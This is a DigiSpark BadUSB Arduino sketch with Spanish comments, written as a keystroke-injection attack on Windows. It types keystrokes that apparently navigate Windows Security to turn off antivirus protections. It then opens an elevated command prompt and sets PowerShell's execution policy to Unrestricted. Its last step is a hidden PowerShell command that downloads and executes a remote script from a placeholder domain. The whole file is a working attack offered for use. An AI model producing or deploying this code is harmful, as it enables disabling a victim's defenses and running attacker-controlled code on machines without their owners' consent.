//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
#define kbd_es_es
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000); // Esperamos un segundo 
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // Tecla Windows para abrir la busqueda 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("Antivirus"); // Buscamos la palabra antivirus
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Pusamos la flexa izquierda
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("\t"); // Tabulamos 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abrimos el ejecutar de Windows 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs"); // Ejecutamos una cmd con privilegios 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Pusamos la flexa izquierda
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false"); // Configuramos la politica de ejecución a Unrestricted 
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.print("powershell -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://dominio.com/payload.ps1')\" "); // Llamamos a nuestro payload alojado en el servidor web
  DigiKeyboard.delay(1000); // Esperamos un segundo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
  DigiKeyboard.delay(1000); // Esperamos un segundo
  for (;;) {
    /*empty*/
  }

}
